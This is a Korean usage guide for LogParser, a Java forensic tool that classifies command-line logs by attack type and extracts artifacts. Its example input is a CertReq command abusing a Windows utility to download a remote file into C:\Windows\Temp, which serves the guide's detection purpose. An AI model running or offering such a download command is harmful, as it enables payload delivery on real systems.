# LogParser 사용 가이드

## 1. LogParser 컴파일

`LogParser`를 실행하기 전에 먼저 `LogParser.java`를 컴파일해야 합니다.

### 1.1 파일 배치 확인

다음 2개 파일이 같은 디렉터리에 있어야 합니다.

```text
LogParser.java
patterns.yml
```

`LogParser`는 실행 시 현재 디렉터리의 `patterns.yml` 파일을 읽어 Grok 패턴을 로드합니다. 따라서 `LogParser.class`가 생성된 위치에서 `patterns.yml`도 함께 확인되어야 합니다.

### 1.2 JDK 설치 확인

`javac` 명령어가 실행되는지 확인합니다.

```bash
javac -version
java -version
```

`javac` 명령어가 없으면 JRE만 설치된 상태일 수 있으므로 JDK를 설치해야 합니다.

### 1.3 컴파일

`LogParser.java`가 있는 디렉터리에서 다음 명령어를 실행합니다.

```bash
javac LogParser.java
```

컴파일이 정상적으로 완료되면 다음과 같은 `.class` 파일이 생성됩니다.

```text
LogParser.class
LogParser$GrokRule.class
```

### 1.4 컴파일 후 실행 구조

최종적으로 같은 디렉터리에 다음 파일들이 있으면 실행할 수 있습니다.

```text
LogParser.class
LogParser$GrokRule.class
patterns.yml
```

실행 명령은 다음과 같습니다.

```bash
java LogParser "[분석할 로그 문자열]"
```

---

## 2. 개요
`LogParser`는 입력된 커맨드라인 로그를 분석하여 공격 유형을 분류하고, 시그니처를 탐지하며, 공격에 사용된 핵심 파일 경로 및 URL 등의 아티팩트를 추출하는 분석 도구입니다.

## 3. 사용 방법
커맨드라인에서 `java LogParser` 명령어 뒤에 분석하고자 하는 로그 문자열을 파라미터로 입력하여 실행합니다.

```bash
java LogParser "[분석할 로그 문자열]"
```

## 4. 실행 예시
다음은 `CertReq` 명령어를 악용한 파일 다운로드 공격 로그를 분석하는 예시입니다.

**입력 명령어:**
```bash
[root@Rocky9 forensic]# java LogParser "CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt"
```

**출력 결과:**
```text
[*] 입력된 로그: CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
========================================
[*] 공격 카테고리 : Download
[*] 탐지 시그니처 : DOWN_CERTREQ_1
----------------------------------------
[+] process : CertReq
[+] targetFile : https://www.example.org/file.ext
[+] targetFile2 : C:\Windows\Temp\file.ext
========================================
```

## 5. 핵심 결과 분석
출력된 결과 중 `[*]`로 표시된 디버깅 및 기본 분석 정보(공격 카테고리, 시그니처 등)를 제외했을 때, **가장 핵심이 되는 정보는 최종 목적지 파일 경로**입니다. 

위 예시에서 공격자가 원격지(`targetFile`)에서 파일을 다운로드하여 로컬 시스템의 어느 위치에 저장하려고 했는지 다음 항목을 통해 명확히 확인할 수 있습니다.

* **`[+] targetFile2 : C:\Windows\Temp\file.ext`** *(이 경로는 시스템에 실제로 생성되거나 조작되는 대상 파일 위치를 나타내므로 침해사고 조사 시 가장 우선적으로 확인해야 합니다.)*

---
